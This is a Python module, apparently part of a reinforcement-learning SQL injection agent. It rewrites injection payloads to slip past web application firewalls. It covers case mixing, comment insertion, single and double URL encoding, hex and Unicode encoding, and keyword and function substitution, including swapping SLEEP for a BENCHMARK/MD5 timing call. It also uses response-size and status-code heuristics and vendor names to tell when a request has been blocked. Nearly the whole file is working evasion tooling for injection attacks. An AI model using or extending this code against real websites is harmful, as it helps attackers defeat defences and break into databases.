"""
Bypass-WAF Module for SQL Injection RL Agent
Applies transformations to tokens/payloads to bypass WAF detection
"""

import random
import urllib.parse
import base64
import re
import os
from typing import Dict, List, Any, Optional, Union


class BypassWAF:
    """WAF bypass techniques for SQL injection payloads"""
    
    def __init__(self, blocked_keywords: Optional[Union[List[str], str]] = None):
        """
        Initialize BypassWAF with optional custom blocked keywords

        Args:
            blocked_keywords: Can be:
                - None: Use default blocked keywords
                - List[str]: Custom list of keywords to block
                - str: Path to text file containing keywords (one per line)
        """
        self.bypass_methods = {
            'case_variation': self._case_variation,
            'comment_insertion': self._comment_insertion,
            'whitespace_manipulation': self._whitespace_manipulation,
            'url_encoding': self._url_encoding,
            'double_url_encoding': self._double_url_encoding,
            'hex_encoding': self._hex_encoding,
            'unicode_encoding': self._unicode_encoding,
            'keyword_replacement': self._keyword_replacement,
            'function_obfuscation': self._function_obfuscation,
            'arithmetic_obfuscation': self._arithmetic_obfuscation
        }

        # WAF detection patterns (simple heuristics)
        self.waf_indicators = [
            'blocked', 'forbidden', 'access denied', 'security violation',
            'malicious request', 'attack detected', 'suspicious activity',
            'cloudflare', 'mod_security', 'imperva', 'f5', 'barracuda',
            'incapsula', 'sucuri', 'akamai', 'aws waf', 'azure waf'
        ]

        # Default blocked keywords
        default_blocked_keywords = [
            'SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP',
            'EXEC', 'EXECUTE', 'SCRIPT', 'ALERT', 'ONLOAD', 'ONERROR',
            'CREATE', 'ALTER', 'TRUNCATE', 'GRANT', 'REVOKE'
        ]

        self.baseline_200 = None
        self.baseline_404 = None
        self.content_size_threshold = 0.5 

        # Load blocked keywords based on input type
        self.blocked_keywords = self._load_blocked_keywords(blocked_keywords, default_blocked_keywords)

    def _load_blocked_keywords(self, blocked_keywords: Optional[Union[List[str], str]],
                              default_keywords: List[str]) -> List[str]:
        """
        Load blocked keywords from various sources

        Args:
            blocked_keywords: None, list of keywords, or file path
            default_keywords: Default keywords to use if None provided

        Returns:
            List of uppercase blocked keywords
        """
        if blocked_keywords is None:
            # Use default keywords
            keywords = default_keywords
            print(f"🛡️ Using default blocked keywords: {len(keywords)} keywords")

        elif isinstance(blocked_keywords, list):
            # Use provided list
            keywords = blocked_keywords
            print(f"🛡️ Using custom blocked keywords: {len(keywords)} keywords")

        elif isinstance(blocked_keywords, str):
            # Load from file
            try:
                keywords = self._load_keywords_from_file(blocked_keywords)
                print(f"🛡️ Loaded blocked keywords from file '{blocked_keywords}': {len(keywords)} keywords")
            except Exception as e:
                print(f"⚠️ Failed to load keywords from file '{blocked_keywords}': {e}")
                print(f"🛡️ Falling back to default keywords: {len(default_keywords)} keywords")
                keywords = default_keywords
        else:
            # Invalid type, use default
            print(f"⚠️ Invalid blocked_keywords type: {type(blocked_keywords)}")
            print(f"🛡️ Using default keywords: {len(default_keywords)} keywords")
            keywords = default_keywords

        # Convert to uppercase for case-insensitive matching
        return [keyword.upper().strip() for keyword in keywords if keyword.strip()]

    def _load_keywords_from_file(self, file_path: str) -> List[str]:
        """
        Load keywords from text file (one keyword per line)

        Args:
            file_path: Path to text file containing keywords

        Returns:
            List of keywords from file

        Raises:
            FileNotFoundError: If file doesn't exist
            Exception: If file can't be read
        """
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"Keywords file not found: {file_path}")

        keywords = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()

                    # Skip empty lines and comments
                    if not line or line.startswith('#'):
                        continue

                    # Handle multiple keywords per line (space or comma separated)
                    if ',' in line:
                        line_keywords = [kw.strip() for kw in line.split(',')]
                    else:
                        line_keywords = line.split()

                    for keyword in line_keywords:
                        if keyword:  # Skip empty strings
                            keywords.append(keyword)

            if not keywords:
                raise Exception("No valid keywords found in file")

            return keywords

        except Exception as e:
            raise Exception(f"Error reading file: {e}")
        
    

    def is_likely_blocked(self, response_status: int, response_content: str,
                        response_time: float = 0) -> bool:
        """Determine if response indicates WAF blocking"""
        
        content_length = len(response_content)

        # Lưu baseline cho 200 và 404 lần đầu
        if response_status == 200 and self.baseline_200 is None:
            self.baseline_200 = content_length
        elif response_status == 404 and self.baseline_404 is None:
            self.baseline_404 = content_length

        # Nếu status code rõ ràng -> block
        if response_status in [403, 406, 429, 501, 503]:
            return True

        # # Nếu chứa từ khóa chỉ báo WAF
        # content_lower = response_content.lower()
        # for indicator in self.waf_indicators:
        #     if indicator in content_lower:
        #         return True

        # Nếu có baseline → so sánh độ dài
        if self.baseline_200 and response_status == 200:
            diff = abs(content_length - self.baseline_200) / max(self.baseline_200, 1)
            if diff > self.content_size_threshold:
                return True

        if self.baseline_404 and response_status not in [200, 404]:
            diff = abs(content_length - self.baseline_404) / max(self.baseline_404, 1)
            if diff > self.content_size_threshold:
                return True

        # (tùy chọn) Nếu response quá nhanh mà không phải 200 (block tức thì)
        # if response_time < 0.02 and response_status != 200:
        #     return True

        return False

    
    def should_bypass_token(self, token: str) -> bool:
        """Check if token is likely to be blocked"""
        return token.upper() in self.blocked_keywords
    
    def apply_bypass_to_token(self, token: str, method: str = None, **kwargs) -> Dict[str, Any]:
        """
        Apply bypass technique to a single token.

        Args:
            token: Single token to bypass
            method: Bypass method to use (random if None)

        Returns:
            Dictionary with bypass result
        """
        if method is None:
            # Randomly select a method suitable for single tokens
            token_methods = ['case_variation', 'comment_insertion', 'url_encoding',
                           'hex_encoding', 'unicode_encoding']
            method = random.choice(token_methods)

        original_token = token

        if method in self.bypass_methods:
            try:
                bypassed_token = self.bypass_methods[method](token, **kwargs)
                return {
                    'original': original_token,
                    'bypassed': bypassed_token,
                    'method': method,
                    'success': True,
                    'error': None
                }
            except Exception as e:
                return {
                    'original': original_token,
                    'bypassed': original_token,
                    'method': method,
                    'success': False,
                    'error': str(e)
                }
        else:
            return {
                'original': original_token,
                'bypassed': original_token,
                'method': method,
                'success': False,
                'error': f"Unknown bypass method: {method}"
            }

    def apply_bypass(self, payload: str, method: str = None, **kwargs) -> str:
        """Apply bypass technique to payload (legacy method)"""
        if method is None:
            # Randomly select a method
            method = random.choice(list(self.bypass_methods.keys()))

        if method in self.bypass_methods:
            try:
                return self.bypass_methods[method](payload, **kwargs)
            except Exception as e:
                print(f"Bypass method {method} failed: {e}")
                return payload
        else:
            print(f"Unknown bypass method: {method}")
            return payload
    
    def apply_multiple_bypasses(self, payload: str, num_methods: int = 2) -> str:
        """Apply multiple bypass techniques"""
        methods = random.sample(list(self.bypass_methods.keys()), 
                               min(num_methods, len(self.bypass_methods)))
        
        result = payload
        for method in methods:
            result = self.apply_bypass(result, method)
        
        return result
    
    def _case_variation(self, payload: str, **kwargs) -> str:
        """Apply case variation to bypass case-sensitive filters"""
        variation_type = kwargs.get('type', 'random')
        
        if variation_type == 'random':
            return ''.join(char.upper() if random.choice([True, False]) else char.lower() 
                          for char in payload)
        elif variation_type == 'alternate':
            return ''.join(char.upper() if i % 2 == 0 else char.lower() 
                          for i, char in enumerate(payload))
        elif variation_type == 'upper':
            return payload.upper()
        elif variation_type == 'lower':
            return payload.lower()
        else:
            return payload
    
    def _comment_insertion(self, payload: str, **kwargs) -> str:
        """Insert SQL comments to break up keywords"""
        comment_type = kwargs.get('type', '/**/')
        
        # Insert comments between characters of keywords
        keywords = self.blocked_keywords
        
        result = payload
        for keyword in keywords:
            if keyword in result.upper():
                # Insert comment in middle of keyword
                mid = len(keyword) // 2
                obfuscated = keyword[:mid] + comment_type + keyword[mid:]
                result = result.replace(keyword, obfuscated)
                result = result.replace(keyword.lower(), obfuscated.lower())
        
        return result
    
    def _whitespace_manipulation(self, payload: str, **kwargs) -> str:
        """Manipulate whitespace to bypass filters"""
        method = kwargs.get('method', 'tabs')
        
        if method == 'tabs':
            return payload.replace(' ', '\t')
        elif method == 'newlines':
            return payload.replace(' ', '\n')
        elif method == 'multiple_spaces':
            return payload.replace(' ', '  ')
        elif method == 'mixed':
            replacements = ['\t', '\n', '  ', '\r']
            result = payload
            for space in [' ']:
                if space in result:
                    result = result.replace(space, random.choice(replacements))
            return result
        else:
            return payload
    
    def _url_encoding(self, payload: str, **kwargs) -> str:
        """Apply URL encoding"""
        return urllib.parse.quote(payload, safe='')
    
    def _double_url_encoding(self, payload: str, **kwargs) -> str:
        """Apply double URL encoding"""
        single_encoded = urllib.parse.quote(payload, safe='')
        return urllib.parse.quote(single_encoded, safe='')
    
    def _hex_encoding(self, payload: str, **kwargs) -> str:
        """Convert to hexadecimal encoding"""
        prefix = kwargs.get('prefix', '0x')
        
        hex_chars = []
        for char in payload:
            hex_val = hex(ord(char))[2:].upper()
            hex_chars.append(f"{prefix}{hex_val}")
        
        return ''.join(hex_chars)
    
    def _unicode_encoding(self, payload: str, **kwargs) -> str:
        """Apply Unicode encoding"""
        format_type = kwargs.get('format', '%u')
        
        unicode_chars = []
        for char in payload:
            unicode_val = f"{format_type}{ord(char):04X}"
            unicode_chars.append(unicode_val)
        
        return ''.join(unicode_chars)
    
    def _keyword_replacement(self, payload: str, **kwargs) -> str:
        """Replace SQL keywords with alternatives"""
        replacements = {
            'SELECT': 'SeLeCt',
            'UNION': 'UnIoN',
            'WHERE': 'WhErE',
            'AND': '&&',
            'OR': '||',
            'SLEEP': 'BENCHMARK(1000000,MD5(1))',
            '=': 'LIKE',
            ' ': '/**/',
        }
        
        result = payload
        for original, replacement in replacements.items():
            result = result.replace(original, replacement)
            result = result.replace(original.lower(), replacement.lower())
        
        return result
    
    def _function_obfuscation(self, payload: str, **kwargs) -> str:
        """Obfuscate SQL functions"""
        # Replace common functions with alternatives
        function_replacements = {
            'CONCAT': 'CONCAT_WS',
            'SUBSTRING': 'MID',
            'ASCII': 'ORD',
            'LENGTH': 'CHAR_LENGTH',
            'USER()': 'CURRENT_USER()',
            'DATABASE()': 'SCHEMA()'
        }
        
        result = payload
        for original, replacement in function_replacements.items():
            result = result.replace(original, replacement)
            result = result.replace(original.lower(), replacement.lower())
        
        return result
    
    def _arithmetic_obfuscation(self, payload: str, **kwargs) -> str:
        """Use arithmetic operations to obfuscate values"""
        # Replace simple numbers with arithmetic expressions
        number_replacements = {
            '1': '(2-1)',
            '0': '(1-1)',
            '2': '(1+1)',
            '3': '(2+1)',
            '4': '(2*2)',
            '5': '(3+2)',
            '6': '(2*3)',
            '7': '(3+4)',
        }
        
        result = payload
        for original, replacement in number_replacements.items():
            # Only replace standalone numbers
            result = re.sub(r'\b' + original + r'\b', replacement, result)
        
        return result
    
    def get_available_methods(self) -> List[str]:
        """Get list of available bypass methods"""
        return list(self.bypass_methods.keys())
    
    def analyze_response_for_waf(self, status_code: int, content: str, 
                                headers: Dict[str, str] = None) -> Dict[str, Any]:
        """Analyze response to detect WAF presence and blocking"""
        analysis = {
            'waf_detected': False,
            'likely_blocked': False,
            'waf_type': None,
            'confidence': 0.0,
            'indicators': []
        }
        
        # Check status code
        if status_code in [403, 406, 429, 501, 503]:
            analysis['likely_blocked'] = True
            analysis['indicators'].append(f'Status code: {status_code}')
        
        # Check content
        content_lower = content.lower()
        for indicator in self.waf_indicators:
            if indicator in content_lower:
                analysis['waf_detected'] = True
                analysis['likely_blocked'] = True
                analysis['indicators'].append(f'Content indicator: {indicator}')
                
                # Try to identify WAF type
                if 'cloudflare' in indicator:
                    analysis['waf_type'] = 'Cloudflare'
                elif 'mod_security' in indicator:
                    analysis['waf_type'] = 'ModSecurity'
                elif 'imperva' in indicator:
                    analysis['waf_type'] = 'Imperva'
        
        # Check headers
        if headers:
            for header, value in headers.items():
                header_lower = header.lower()
                value_lower = str(value).lower()
                
                if 'cloudflare' in value_lower:
                    analysis['waf_detected'] = True
                    analysis['waf_type'] = 'Cloudflare'
                elif 'server' in header_lower and any(waf in value_lower for waf in ['nginx', 'apache']):
                    analysis['indicators'].append(f'Server header: {value}')
        
        # Calculate confidence
        if analysis['indicators']:
            analysis['confidence'] = min(len(analysis['indicators']) * 0.3, 1.0)
        
        return analysis
